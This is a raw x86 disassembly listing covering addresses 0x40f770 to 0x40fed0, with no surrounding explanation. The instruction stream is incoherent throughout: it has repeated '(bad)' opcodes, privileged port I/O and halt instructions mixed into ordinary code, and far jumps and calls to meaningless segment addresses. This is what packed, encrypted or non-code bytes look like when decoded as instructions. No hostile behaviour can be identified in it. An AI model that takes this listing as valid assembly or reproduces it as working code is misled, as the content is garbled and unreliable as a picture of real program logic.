  40f770:	lds    esi,FWORD PTR [edi+0x11]
  40f773:	or     al,BYTE PTR ds:0xc306ffc6
  40f779:	jae    0x40f761
  40f77b:	fcomp  DWORD PTR [ebp+0x71]
  40f77e:	sbb    bl,BYTE PTR [esi+0x18]
  40f781:	rcl    esi,cl
  40f783:	or     eax,0xb122d480
  40f788:	mov    dl,BYTE PTR [eax+0x4821328a]
  40f78e:	sub    ebp,ebx
  40f790:	sub    BYTE PTR [edx+eax*8],bl
  40f793:	mov    BYTE PTR [ebp+0x53b0c1c5],al
  40f799:	aas    
  40f79a:	xlat   BYTE PTR ds:[ebx]
  40f79b:	jp     0x40f741
  40f79d:	add    BYTE PTR [ebp-0x539ffe10],ah
  40f7a3:	js     0x40f814
  40f7a5:	xchg   ebp,eax
  40f7a6:	cmp    eax,0xf52473ec
  40f7ab:	in     al,dx
  40f7ac:	std    
  40f7ad:	xor    BYTE PTR [eax+0x24],al
  40f7b0:	push   esp
  40f7b1:	gs aaa 
  40f7b3:	sbb    DWORD PTR [esi],edx
  40f7b5:	push   ecx
  40f7b6:	xchg   edx,eax
  40f7b7:	icebp  
  40f7b8:	rcr    DWORD PTR [esi],0xae
  40f7bb:	pop    edi
  40f7bc:	mov    esi,0x82dab842
  40f7c1:	and    bl,BYTE PTR [edi+0x4]
  40f7c4:	sub    esi,DWORD PTR [ebx]
  40f7c6:	inc    edx
  40f7c7:	add    DWORD PTR [edi+0x5c],0x65
  40f7cb:	jns    0x40f83b
  40f7cd:	aas    
  40f7ce:	hlt    
  40f7cf:	dec    esi
  40f7d0:	dec    ebx
  40f7d1:	ins    BYTE PTR es:[edi],dx
  40f7d2:	imul   ebp,DWORD PTR [ecx-0x3dae0c52],0x45
  40f7d9:	inc    DWORD PTR [edx+esi*8]
  40f7dc:	and    eax,0x4a9aecc5
  40f7e1:	add    ah,BYTE PTR [ebx+eax*1-0x3]
  40f7e5:	(bad)  
  40f7e6:	push   ss
  40f7e7:	push   ecx
  40f7e8:	rcl    BYTE PTR [ebx-0x4a],1
  40f7eb:	add    BYTE PTR [edi+0x1d98b1dc],0x4
  40f7f2:	ror    ebx,1
  40f7f4:	les    edi,FWORD PTR [ecx]
  40f7f6:	hlt    
  40f7f7:	pop    eax
  40f7f8:	push   eax
  40f7f9:	nop
  40f7fa:	jb     0x40f7e2
  40f7fc:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40f7fe:	cmp    al,BYTE PTR [ebx+0x1dab7782]
  40f804:	pop    ebp
  40f805:	loop   0x40f78c
  40f807:	jns    0x40f7fe
  40f809:	call   0x7fb5c9ff
  40f80e:	add    BYTE PTR [edi+ecx*2],0x1d
  40f812:	pop    esp
  40f813:	adc    dh,BYTE PTR [eax+0x4f3f6ba7]
  40f819:	add    BYTE PTR [esi],bl
  40f81b:	add    BYTE PTR [ebx],bh
  40f81d:	mov    dh,0xac
  40f81f:	push   cs
  40f820:	dec    eax
  40f821:	cmp    ecx,DWORD PTR [edx+0x22]
  40f824:	(bad)  
  40f825:	sahf   
  40f826:	scas   eax,DWORD PTR es:[edi]
  40f827:	pop    ss
  40f828:	sbb    eax,0xe0788ed0
  40f82d:	jmp    0x1bc4:0x66631418
  40f834:	les    esp,FWORD PTR [ebp-0x613f5c2]
  40f83a:	call   0x890a01b3
  40f83f:	fcmove st,st(2)
  40f841:	out    0x59,eax
  40f843:	loopne 0x40f8c2
  40f845:	xchg   ecx,eax
  40f846:	jb     0x40f892
  40f848:	or     al,0x5e
  40f84a:	cmp    eax,0x52fada8
  40f84f:	add    eax,0x1ec516ce
  40f854:	arpl   WORD PTR [edi+eiz*8],si
  40f857:	inc    BYTE PTR [edx]
  40f859:	inc    esi
  40f85a:	sub    DWORD PTR [ecx],ebp
  40f85c:	pop    edx
  40f85d:	xor    bh,BYTE PTR [esi-0x43]
  40f860:	pop    edi
  40f861:	and    al,0x6b
  40f863:	std    
  40f864:	pop    ebp
  40f865:	mov    ds:0xbd1b9f23,al
  40f86a:	push   eax
  40f86b:	and    esi,0x7f
  40f86e:	gs daa 
  40f870:	stos   BYTE PTR es:[edi],al
  40f871:	xor    DWORD PTR [edi-0x18aacb4d],ebx
  40f877:	rcl    BYTE PTR [ecx-0x7b9fd514],0xe9
  40f87e:	test   DWORD PTR [ecx-0x31],edi
  40f881:	or     ecx,DWORD PTR [esp+eax*4-0x10]
  40f885:	and    eax,esi
  40f887:	push   cs
  40f888:	imul   ecx,DWORD PTR [ecx],0xceec1028
  40f88e:	sbb    dh,ch
  40f890:	dec    edi
  40f891:	stc    
  40f892:	test   al,0xf3
  40f894:	shl    esp,cl
  40f896:	ret    0x9541
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	and    DWORD PTR [esp+ecx*4+0x39],ebp
  40f89e:	dec    ebx
  40f89f:	adc    eax,0x17c364b3
  40f8a4:	enter  0x46b7,0xdf
  40f8a8:	mov    esp,0x9214f1dc
  40f8ad:	sub    eax,0x22666aeb
  40f8b2:	rcr    DWORD PTR [bx],1
  40f8b5:	mov    BYTE PTR [ecx+ebp*1-0x33a99457],bh
  40f8bc:	lahf   
  40f8bd:	outs   dx,BYTE PTR ds:[esi]
  40f8be:	pop    edi
  40f8bf:	rcl    BYTE PTR [edx],1
  40f8c1:	les    edi,FWORD PTR [ebp-0x80]
  40f8c4:	test   BYTE PTR [edi-0x3d],cl
  40f8c7:	scas   al,BYTE PTR es:[edi]
  40f8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c9:	test   al,0xcf
  40f8cb:	and    BYTE PTR [ecx+ebx*8],al
  40f8ce:	cwde   
  40f8cf:	sbb    cl,ah
  40f8d1:	push   0xfffffff2
  40f8d3:	scas   al,BYTE PTR es:[edi]
  40f8d4:	adc    al,BYTE PTR [esi+ecx*1-0xd98b282]
  40f8db:	cli    
  40f8dc:	jp     0x40f8f1
  40f8de:	rol    ch,0x59
  40f8e1:	test   BYTE PTR [edx],ah
  40f8e3:	imul   ebx,ebp,0x67
  40f8e6:	xchg   esp,eax
  40f8e7:	jge    0x40f8f4
  40f8e9:	mov    ebx,0x3c0cb4c9
  40f8ee:	push   esi
  40f8ef:	cld    
  40f8f0:	cdq    
  40f8f1:	sbb    al,0x40
  40f8f3:	fild   WORD PTR [ecx-0x4]
  40f8f6:	mov    cl,0x3b
  40f8f8:	xchg   edi,eax
  40f8f9:	pop    esp
  40f8fa:	push   eax
  40f8fb:	mov    bl,0x7a
  40f8fd:	outs   dx,DWORD PTR ds:[esi]
  40f8fe:	fdivrp st(5),st
  40f900:	and    eax,DWORD PTR [ecx]
  40f902:	retf   
  40f903:	or     ecx,DWORD PTR [ebx]
  40f905:	pop    eax
  40f906:	pop    ecx
  40f907:	xchg   BYTE PTR [esi],al
  40f909:	addr16 cli 
  40f90b:	pop    esi
  40f90c:	in     al,dx
  40f90d:	inc    esi
  40f90e:	mov    ebp,0xec7e3deb
  40f913:	loop   0x40f990
  40f915:	mov    ebx,eax
  40f917:	mov    ebp,0x83d5577a
  40f91c:	loopne 0x40f8d0
  40f91e:	je     0x40f8ed
  40f920:	xor    esi,DWORD PTR [esi-0x6d]
  40f923:	mov    eax,ebx
  40f925:	psubb  mm7,QWORD PTR [edx-0x11b9a592]
  40f92c:	gs xchg edx,eax
  40f92e:	push   ecx
  40f92f:	mov    DWORD PTR [ecx-0x5a],eax
  40f932:	xchg   edi,eax
  40f933:	jmp    0xa985:0xb2632c94
  40f93a:	mov    dl,0x22
  40f93c:	pop    es
  40f93d:	arpl   WORD PTR [ebx-0x14049db5],cx
  40f943:	not    DWORD PTR [ebp+0x6e]
  40f946:	jne    0x40f9c0
  40f948:	mov    cl,0xba
  40f94a:	push   ecx
  40f94b:	or     esp,esi
  40f94d:	fdiv   QWORD PTR [ebx-0xdeb7004]
  40f953:	add    eax,0xb41d7bd8
  40f958:	pushf  
  40f959:	adc    esp,esi
  40f95b:	cmp    ch,ch
  40f95d:	dec    ebp
  40f95e:	and    DWORD PTR [esi+0x39],0xde1e17a0
  40f965:	aad    0xc7
  40f967:	call   0x9d32504c
  40f96c:	std    
  40f96d:	leave  
  40f96e:	sbb    eax,0x8da3bf47
  40f973:	cmp    ah,BYTE PTR [edi]
  40f975:	ja     0x40f99c
  40f977:	mov    cl,BYTE PTR [eax]
  40f979:	jae    0x40f9bc
  40f97b:	stos   BYTE PTR es:[edi],al
  40f97c:	jmp    0xa50b4310
  40f981:	pusha  
  40f982:	adc    DWORD PTR [ecx-0x7bd65a93],esi
  40f988:	push   eax
  40f989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f98a:	adc    al,0x8b
  40f98c:	dec    ebx
  40f98d:	xchg   ecx,eax
  40f98e:	sub    dh,0xe5
  40f991:	push   esi
  40f992:	ss clc 
  40f994:	mov    esi,0x81f524b3
  40f999:	ss push ecx
  40f99b:	rcl    BYTE PTR [ebx-0x416bc19],0x33
  40f9a2:	adc    BYTE PTR [edx],0x1
  40f9a5:	lahf   
  40f9a6:	mov    ah,0x44
  40f9a8:	mov    ebx,0x48380291
  40f9ad:	adc    BYTE PTR [ecx+0x26],ch
  40f9b0:	or     eax,DWORD PTR [esi+ebp*8+0x78ba5e9c]
  40f9b7:	push   ebx
  40f9b8:	les    edi,FWORD PTR [ecx-0x2deb1f2]
  40f9be:	sbb    DWORD PTR ds:0xca2cd77,edx
  40f9c4:	sbb    edx,DWORD PTR [ecx+0x74e2e114]
  40f9ca:	mov    eax,0x79d2caf
  40f9cf:	dec    eax
  40f9d0:	stos   DWORD PTR es:[edi],eax
  40f9d1:	push   ecx
  40f9d2:	rcl    BYTE PTR [esi],1
  40f9d4:	and    al,0xc2
  40f9d6:	adc    al,0x98
  40f9d8:	retf   
  40f9d9:	into   
  40f9da:	cdq    
  40f9db:	ins    BYTE PTR es:[edi],dx
  40f9dc:	repnz ds scas al,BYTE PTR es:[edi]
  40f9df:	fimul  DWORD PTR [ebx]
  40f9e1:	lea    esi,[ecx+eiz*1]
  40f9e4:	mov    bh,0xa1
  40f9e6:	sub    eax,0xa29284fa
  40f9eb:	(bad)  
  40f9ec:	in     eax,0x74
  40f9ee:	gs pop es
  40f9f0:	inc    edx
  40f9f1:	dec    edx
  40f9f2:	pop    ebx
  40f9f3:	out    0xb9,al
  40f9f5:	push   ebp
  40f9f6:	cmp    al,0x9e
  40f9f9:	icebp  
  40f9fa:	into   
  40f9fb:	fs sub eax,0x75fbf9d7
  40fa01:	mov    bh,0x26
  40fa03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa04:	not    dh
  40fa06:	js     0x40f9c1
  40fa08:	rcr    BYTE PTR [esi-0x47],0x4
  40fa0c:	sub    al,0x8e
  40fa0e:	fld    DWORD PTR [edx+0x2c]
  40fa11:	fs fcomi st,st(4)
  40fa14:	and    bh,cl
  40fa16:	cmp    al,0x54
  40fa18:	arpl   WORD PTR [eax],ax
  40fa1a:	sub    cl,BYTE PTR [esi+0xb]
  40fa1d:	hlt    
  40fa1e:	aas    
  40fa1f:	imul   ebx,DWORD PTR [esi-0x63],0x9fb6f298
  40fa26:	sar    DWORD PTR [ebp-0x5f],0x77
  40fa2a:	mov    al,ds:0xba9a61aa
  40fa2f:	test   BYTE PTR [ecx],dh
  40fa31:	lahf   
  40fa32:	in     al,0x26
  40fa34:	pushf  
  40fa35:	cmp    eax,0xe251264
  40fa3a:	sbb    edi,DWORD PTR [edi]
  40fa3c:	sbb    esp,DWORD PTR ss:[esi-0x4c]
  40fa40:	mov    edx,0xd100d36
  40fa45:	daa    
  40fa46:	or     BYTE PTR [edx],ah
  40fa48:	js     0x40fa43
  40fa4a:	xchg   esi,eax
  40fa4b:	mov    ds:0x8855355f,al
  40fa50:	pop    edx
  40fa51:	sub    esp,esp
  40fa53:	pop    edi
  40fa54:	lods   al,BYTE PTR ds:[esi]
  40fa55:	or     al,0xbf
  40fa57:	pop    edi
  40fa58:	add    al,0xdb
  40fa5a:	stos   BYTE PTR es:[edi],al
  40fa5b:	out    0xa9,eax
  40fa5d:	inc    eax
  40fa5e:	or     ch,al
  40fa60:	mov    ecx,0x529ff168
  40fa65:	jb     0x40fa70
  40fa67:	ds dec edi
  40fa69:	outs   dx,BYTE PTR ds:[esi]
  40fa6a:	js     0x40fa81
  40fa6c:	fcom   DWORD PTR [ebp-0x4c4ac638]
  40fa72:	fnsave [edi+0x49]
  40fa75:	gs loopne 0x40fa35
  40fa78:	rcl    BYTE PTR [eax+edx*4-0x678f6952],0xf7
  40fa80:	push   esp
  40fa81:	sahf   
  40fa82:	or     bl,dh
  40fa84:	mov    eax,DWORD PTR [edi+0xcf3e4cd]
  40fa8a:	cld    
  40fa8b:	data16 ins BYTE PTR es:[edi],dx
  40fa8d:	sub    al,0x8c
  40fa8f:	mul    BYTE PTR [ecx-0x76]
  40fa92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa93:	aad    0xcf
  40fa95:	sub    al,0xa7
  40fa97:	and    eax,DWORD PTR [ebp+0x18215ddd]
  40fa9d:	sub    eax,0xc7fd9990
  40faa2:	inc    edi
  40faa3:	ficomp DWORD PTR [eax]
  40faa5:	sbb    BYTE PTR [eax-0x4d],ah
  40faa8:	sub    BYTE PTR [esi],dh
  40faaa:	push   ebx
  40faab:	xchg   ebp,eax
  40faac:	clc    
  40faad:	adc    edi,DWORD PTR [edx+0x17ac1c40]
  40fab3:	out    dx,eax
  40fab4:	jae    0x40fad7
  40fab6:	sbb    ah,BYTE PTR [eax]
  40fab8:	js     0x40fae3
  40faba:	mov    esi,0x27db614d
  40fabf:	xor    eax,0x58a5b564
  40fac4:	pop    esp
  40fac5:	(bad)  
  40fac7:	imul   ebp,DWORD PTR [esi+0x2f48b379],0x1d09e4cf
  40fad1:	arpl   bx,ax
  40fad3:	(bad)  
  40fad4:	and    BYTE PTR [eax+0x288ebb8c],bh
  40fada:	imul   eax,ebx,0xadd0d465
  40fae0:	icebp  
  40fae1:	add    al,0xa7
  40fae3:	add    esp,edi
  40fae5:	in     eax,0x84
  40fae7:	adc    cl,BYTE PTR [edx+eax*2]
  40faea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faeb:	leave  
  40faec:	jmp    0x884f:0x4d77792d
  40faf3:	jp     0x40fad1
  40faf5:	test   dl,0x59
  40faf8:	pop    eax
  40faf9:	push   ss
  40fafa:	adc    esi,DWORD PTR [esi]
  40fafc:	pop    es
  40fafd:	xchg   ebx,eax
  40fafe:	mov    edx,0xed641b72
  40fb03:	rcr    esp,0x45
  40fb06:	mov    bl,0xcf
  40fb08:	setl   BYTE PTR [ecx-0x797cb3c6]
  40fb0f:	in     al,0x28
  40fb11:	jmp    0x55e0:0x6036abf7
  40fb18:	jb     0x40fb50
  40fb1a:	sbb    al,0xc
  40fb1d:	fdiv   QWORD PTR [esi]
  40fb1f:	call   0x8dff:0x8429c1f7
  40fb26:	pushf  
  40fb27:	sub    esi,esp
  40fb29:	jb     0x40fb01
  40fb2b:	repz dec esi
  40fb2d:	push   ebp
  40fb2e:	pusha  
  40fb2f:	xchg   ebx,eax
  40fb30:	(bad)  
  40fb31:	sub    al,0xe2
  40fb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb34:	xchg   edx,eax
  40fb35:	sub    eax,0x8cf415ef
  40fb3a:	loopne 0x40fb93
  40fb3c:	sar    DWORD PTR [eax-0x3a],cl
  40fb3f:	and    DWORD PTR [edx+0x749967b4],eax
  40fb45:	les    ebx,FWORD PTR [ecx-0x528a920d]
  40fb4b:	fisttp DWORD PTR [edi+0x76d6d0c1]
  40fb51:	add    ah,0x3d
  40fb54:	pop    ebp
  40fb55:	mov    bl,0xed
  40fb57:	sub    BYTE PTR [ecx+0x60],0x1c
  40fb5b:	xchg   ebx,eax
  40fb5c:	cmp    BYTE PTR [edx-0x2d968e04],ch
  40fb62:	jb     0x40fb19
  40fb64:	xor    DWORD PTR [ecx+ebp*2+0x87d71ba],ebx
  40fb6b:	mov    ebp,0xee95c8b7
  40fb70:	push   edx
  40fb71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb72:	adc    dh,0x73
  40fb75:	pusha  
  40fb76:	cmp    ebp,DWORD PTR [ebx]
  40fb78:	gs mov edi,0xc99c7ae7
  40fb7e:	retf   
  40fb7f:	std    
  40fb80:	mov    al,0x54
  40fb82:	add    eax,0x123fa187
  40fb87:	xchg   bx,ax
  40fb89:	stos   BYTE PTR es:[edi],al
  40fb8a:	cmp    ebx,DWORD PTR [ecx+edx*2+0x1]
  40fb8e:	jb     0x40fb87
  40fb90:	lds    ebx,FWORD PTR [esi-0x4349a98]
  40fb96:	test   DWORD PTR [edx-0x19],ebx
  40fb99:	mov    dl,0x44
  40fb9b:	mov    bl,0x77
  40fb9d:	adc    ax,ax
  40fba0:	push   ebp
  40fba1:	jae    0x40fbd3
  40fba3:	dec    edi
  40fba4:	xchg   ebx,esi
  40fba6:	or     eax,0x937ff6a8
  40fbab:	(bad)  
  40fbac:	jmp    DWORD PTR [ebx-0x3d]
  40fbaf:	dec    ebp
  40fbb0:	rcl    DWORD PTR [edi-0x6bb40b71],cl
  40fbb6:	mov    eax,ds:0xbebf154f
  40fbbc:	faddp  st(2),st
  40fbbe:	scas   eax,DWORD PTR es:[edi]
  40fbbf:	fdivr  QWORD PTR [esi+ebx*4+0x6d]
  40fbc3:	push   ebp
  40fbc4:	sub    ebx,DWORD PTR [esp+ebx*8-0x74]
  40fbc8:	les    ebp,FWORD PTR [edi]
  40fbca:	cmp    eax,0x8ea9ff02
  40fbcf:	push   eax
  40fbd0:	mov    bl,0x3b
  40fbd2:	test   eax,0x45fe07f7
  40fbd7:	lods   al,BYTE PTR ds:[esi]
  40fbd8:	pop    es
  40fbd9:	add    eax,0x3abc7dd4
  40fbde:	dec    edi
  40fbdf:	mov    bh,0xb0
  40fbe1:	jle    0x40fbfd
  40fbe3:	mov    ecx,0x28403431
  40fbe8:	lahf   
  40fbe9:	(bad)  
  40fbea:	pop    ebp
  40fbeb:	or     al,0xa8
  40fbed:	scas   al,BYTE PTR es:[edi]
  40fbee:	xchg   esi,eax
  40fbef:	fild   WORD PTR [esi]
  40fbf1:	(bad)  
  40fbf2:	loop   0x40fb92
  40fbf4:	enter  0x99d7,0x75
  40fbf8:	xor    al,0x0
  40fbfa:	cmp    eax,0x868c6072
  40fbff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc00:	fs cs jmp 0x40fb94
  40fc04:	rcr    DWORD PTR [ebp+0x26],1
  40fc07:	xchg   edx,eax
  40fc08:	stos   DWORD PTR es:[edi],eax
  40fc09:	dec    ebx
  40fc0a:	aas    
  40fc0b:	adc    ch,0x3b
  40fc0e:	xchg   BYTE PTR [ebx+ecx*8],bh
  40fc11:	(bad)  
  40fc12:	sub    al,0x87
  40fc14:	xor    DWORD PTR [edx],0xffffffff
  40fc17:	iret   
  40fc18:	pop    ebp
  40fc19:	lods   al,BYTE PTR ds:[esi]
  40fc1a:	retf   0xfb77
  40fc1d:	iret   
  40fc1e:	lea    ebx,[eax+0x2]
  40fc21:	nop
  40fc22:	mov    ebx,0x2f18b9b0
  40fc27:	addr16 push es
  40fc29:	shl    DWORD PTR [eax],0xc0
  40fc2c:	fldenv [esi+0x7a643a2a]
  40fc32:	dec    esp
  40fc33:	call   0x3bad:0x5656e99
  40fc3a:	test   eax,0x29454f7c
  40fc3f:	mov    ah,0xdd
  40fc41:	pushf  
  40fc42:	or     bh,BYTE PTR [edi]
  40fc44:	loope  0x40fc94
  40fc46:	push   0x2e
  40fc48:	xchg   edi,eax
  40fc49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc4a:	or     eax,0x34bd1e5b
  40fc4f:	push   ebx
  40fc50:	imul   BYTE PTR [edx+0x66fdb91]
  40fc56:	pop    es
  40fc57:	push   es
  40fc58:	lods   al,BYTE PTR ds:[esi]
  40fc59:	enter  0xa791,0xfc
  40fc5d:	into   
  40fc5e:	scas   eax,DWORD PTR es:[edi]
  40fc5f:	addr16 mov eax,0x2d0c4a24
  40fc65:	pop    ss
  40fc66:	push   edi
  40fc67:	jb     0x40fc72
  40fc69:	pop    eax
  40fc6a:	cmc    
  40fc6b:	pop    ebp
  40fc6c:	(bad)  
  40fc6d:	dec    ebp
  40fc6e:	js     0x40fbf2
  40fc70:	lahf   
  40fc71:	mov    bl,0xc1
  40fc73:	cmp    bl,cl
  40fc75:	pop    esi
  40fc76:	dec    eax
  40fc77:	imul   eax,DWORD PTR [ecx+0x275ea479],0xffffffe0
  40fc7e:	and    BYTE PTR [ecx+0x1d],ah
  40fc81:	das    
  40fc82:	xlat   BYTE PTR ds:[ebx]
  40fc83:	and    eax,0xb9b72122
  40fc88:	mov    esi,0xc0653d6d
  40fc8d:	cwde   
  40fc8e:	inc    edi
  40fc8f:	adc    cl,dl
  40fc91:	loop   0x40fcff
  40fc93:	jnp    0xbed5b4a4
  40fc99:	or     al,0x12
  40fc9b:	retf   
  40fc9c:	inc    edi
  40fc9d:	mov    WORD PTR [ecx+0x7c138aca],gs
  40fca3:	fs fwait
  40fca5:	jns    0x40fd22
  40fca7:	inc    esi
  40fca8:	imul   esp,DWORD PTR [ebx],0x50793de0
  40fcae:	loopne 0x40fc37
  40fcb0:	sahf   
  40fcb1:	add    esp,DWORD PTR [esi]
  40fcb3:	sub    DWORD PTR [eax-0x793e9dcd],ebx
  40fcb9:	stc    
  40fcba:	fwait
  40fcbb:	ret    
  40fcbc:	mov    cl,0x8c
  40fcbe:	loop   0x40fd01
  40fcc0:	jnp    0x40fc73
  40fcc2:	dec    esp
  40fcc3:	pushf  
  40fcc4:	aam    0xcf
  40fcc6:	mov    ds:0x583abeb6,eax
  40fccb:	jno    0x40fc8d
  40fccd:	and    DWORD PTR [eax],ebp
  40fccf:	inc    esi
  40fcd0:	cld    
  40fcd1:	xor    eax,0xf7a69d2e
  40fcd6:	inc    ebp
  40fcd7:	mov    ecx,DWORD PTR [esp+edx*4]
  40fcda:	enter  0x7110,0x93
  40fcde:	jbe    0x40fcd8
  40fce0:	dec    edx
  40fce1:	pop    esp
  40fce2:	fs popf 
  40fce4:	cmp    al,0x7c
  40fce6:	fmulp  st(1),st
  40fce8:	test   eax,0xfac09783
  40fced:	mov    edx,0xd25fc25c
  40fcf2:	pop    eax
  40fcf3:	xchg   edi,eax
  40fcf4:	cdq    
  40fcf5:	mov    BYTE PTR [ebx+0xf],0xaf
  40fcf9:	cdq    
  40fcfa:	inc    ebx
  40fcfb:	enter  0xe530,0x39
  40fcff:	xchg   esp,eax
  40fd00:	bnd call 0xdd855543
  40fd06:	and    al,0xfe
  40fd08:	daa    
  40fd09:	sahf   
  40fd0a:	fmul   st(0),st
  40fd0c:	fwait
  40fd0d:	test   al,0x3c
  40fd0f:	xor    esi,DWORD PTR [ebx+edi*1]
  40fd12:	lods   eax,DWORD PTR ds:[esi]
  40fd13:	mov    ch,0x9d
  40fd15:	and    DWORD PTR [ecx+0x1e],0xffffffe4
  40fd19:	sbb    eax,0x96372ae9
  40fd1e:	nop
  40fd1f:	xor    bl,BYTE PTR [eax+0x5a]
  40fd22:	(bad)  [edx]
  40fd24:	or     BYTE PTR [edi+0x1a],bh
  40fd27:	sub    ch,BYTE PTR [ecx]
  40fd29:	das    
  40fd2a:	shl    BYTE PTR cs:0xe9806dd,cl
  40fd31:	push   edx
  40fd32:	xor    eax,0x9c22c005
  40fd37:	and    eax,0xfe3067ab
  40fd3c:	fwait
  40fd3d:	adc    DWORD PTR [eax],edi
  40fd3f:	pop    ebp
  40fd40:	int3   
  40fd41:	sub    eax,0x8362021e
  40fd46:	push   cs
  40fd47:	shl    ebp,cl
  40fd49:	jp     0x40fd64
  40fd4b:	dec    edi
  40fd4c:	xchg   edx,eax
  40fd4d:	call   0x90806858
  40fd52:	imul   eax,DWORD PTR [ecx+0x5031d43e],0x67
  40fd59:	sub    esi,DWORD PTR [ebp+0x4e8bf37c]
  40fd5f:	mov    ebp,0x23fcc81e
  40fd64:	loop   0x40fd75
  40fd66:	shr    DWORD PTR ds:0x6ed25f52,0x7
  40fd6d:	sbb    BYTE PTR [edx-0xa],ch
  40fd70:	bound  esi,QWORD PTR [ecx]
  40fd72:	push   edi
  40fd73:	xchg   esp,ebx
  40fd75:	push   ds
  40fd76:	jbe    0x40fd6f
  40fd78:	adc    dl,dh
  40fd7a:	pop    eax
  40fd7b:	inc    ebp
  40fd7c:	rcl    DWORD PTR [ebx-0xb],0xbc
  40fd80:	aam    0x6d
  40fd82:	ror    DWORD PTR [edi],1
  40fd84:	xchg   ecx,eax
  40fd85:	stos   BYTE PTR es:[edi],al
  40fd86:	outs   dx,DWORD PTR ds:[esi]
  40fd87:	cli    
  40fd88:	or     BYTE PTR [ecx],bh
  40fd8a:	mov    ecx,0x94b24b62
  40fd8f:	(bad)  
  40fd90:	push   edx
  40fd91:	xchg   edi,eax
  40fd92:	gs mov ch,0xec
  40fd95:	push   ds
  40fd96:	test   DWORD PTR [eax-0x693b88b5],eax
  40fd9c:	and    al,0xc8
  40fd9e:	mov    ebp,DWORD PTR [esi]
  40fda0:	or     DWORD PTR [edx],ebp
  40fda2:	jne    0x40fd3f
  40fda4:	in     al,0x46
  40fda6:	daa    
  40fda7:	rol    esi,0xd0
  40fdaa:	mov    ds:0xd1fa06cc,eax
  40fdaf:	and    BYTE PTR [eax+0x696d9213],dl
  40fdb5:	mov    ch,0xc0
  40fdb7:	fiadd  WORD PTR [esi-0x7eb2c82e]
  40fdbd:	cwde   
  40fdbe:	and    esi,esi
  40fdc0:	mov    dl,BYTE PTR [edx-0x67ee556]
  40fdc6:	or     DWORD PTR [ebp-0x3296f55f],ebx
  40fdcc:	and    dl,BYTE PTR [eax]
  40fdce:	jp     0x40fe13
  40fdd0:	inc    ebx
  40fdd1:	shr    BYTE PTR ds:0x16704986,1
  40fdd7:	add    BYTE PTR [esi-0x8],al
  40fdda:	outs   dx,BYTE PTR ds:[esi]
  40fddb:	loope  0x40fe16
  40fddd:	jl     0x40fe17
  40fddf:	test   DWORD PTR [esi+0x1281d8f0],edx
  40fde5:	push   edi
  40fde6:	fwait
  40fde7:	pusha  
  40fde8:	dec    ebp
  40fde9:	out    dx,al
  40fdea:	and    al,0xc
  40fdec:	xor    BYTE PTR [esi-0x4ec16024],ah
  40fdf2:	addr16 fs sahf 
  40fdf5:	sub    DWORD PTR [ecx],esp
  40fdf7:	xchg   edi,eax
  40fdf8:	mov    ecx,0xb64a5175
  40fdfd:	or     BYTE PTR [ecx],cl
  40fdff:	fidiv  DWORD PTR [edx+0x1f1a4583]
  40fe05:	mov    al,0x37
  40fe07:	mov    dh,0x26
  40fe09:	sbb    al,0x6c
  40fe0b:	scas   eax,DWORD PTR es:[edi]
  40fe0c:	dec    ebx
  40fe0d:	fwait
  40fe0e:	aas    
  40fe0f:	fnsave [ebx]
  40fe11:	xor    ecx,DWORD PTR [eax+0x252e71d3]
  40fe17:	(bad)  
  40fe18:	cli    
  40fe19:	push   ebx
  40fe1a:	sbb    ecx,DWORD PTR [eax-0x717c3719]
  40fe20:	xchg   ecx,eax
  40fe21:	xchg   DWORD PTR [edx-0x76b9d36f],edi
  40fe27:	cmp    eax,0xbaba82e8
  40fe2c:	hlt    
  40fe2d:	mov    dh,0x96
  40fe2f:	jb     0x40fe3d
  40fe31:	jnp    0x40fdfc
  40fe33:	(bad)  
  40fe34:	mov    esi,0x680cea80
  40fe39:	push   ebp
  40fe3a:	or     dh,bl
  40fe3c:	mov    dl,0xae
  40fe3e:	sbb    eax,0x9c0663d8
  40fe43:	aam    0x88
  40fe45:	cmp    esi,DWORD PTR [edx+0xf004d08]
  40fe4b:	mov    dl,0x18
  40fe4d:	les    ebx,FWORD PTR [edx]
  40fe4f:	cmp    dh,dl
  40fe51:	ret    
  40fe52:	jmp    0x40fdf3
  40fe54:	mov    dh,0x1f
  40fe56:	pop    esp
  40fe57:	sub    eax,0x69fe620
  40fe5c:	fistp  QWORD PTR [edi+0x4da6d434]
  40fe62:	out    0xec,eax
  40fe64:	mov    edx,0x2240a06b
  40fe69:	out    dx,eax
  40fe6a:	pusha  
  40fe6b:	jle    0x40fe0f
  40fe6d:	sbb    DWORD PTR [esi],esi
  40fe6f:	fsubr  DWORD PTR [edi+0x8949636]
  40fe75:	pop    ebp
  40fe76:	sbb    eax,DWORD PTR [edi+0x9]
  40fe79:	enter  0xe47a,0x66
  40fe7d:	mov    ecx,0x51f4a657
  40fe82:	retf   0xfb39
  40fe85:	mov    dl,0x81
  40fe87:	sbb    al,bl
  40fe89:	outs   dx,BYTE PTR ds:[esi]
  40fe8a:	push   ss
  40fe8b:	xchg   esi,eax
  40fe8c:	call   0x5048:0x561cc79
  40fe93:	call   0x2478e0cb
  40fe98:	add    dh,al
  40fe9a:	inc    ebp
  40fe9b:	mov    cl,0x48
  40fe9d:	mov    al,ds:0xe12807da
  40fea2:	pop    esp
  40fea3:	leave  
  40fea4:	sbb    edi,DWORD PTR [eax+0x68]
  40fea7:	or     al,0x83
  40fea9:	dec    ecx
  40feaa:	icebp  
  40feab:	add    bl,ah
  40fead:	aam    0x61
  40feaf:	es out 0xce,al
  40feb2:	jo     0x40ff2a
  40feb4:	outs   dx,DWORD PTR ds:[esi]
  40feb5:	shl    eax,0x35
  40feb8:	jl     0x40fe56
  40feba:	dec    edi
  40febb:	mov    eax,eax
  40febd:	inc    edx
  40febe:	fwait
  40febf:	or     eax,0xf187cf36
  40fec4:	lea    edx,[edx-0x69e63590]
  40feca:	sbb    al,0xa0
  40fecc:	mov    bh,0x38
  40fece:	jmp    0x40fede
  40fed0:	pop    ds
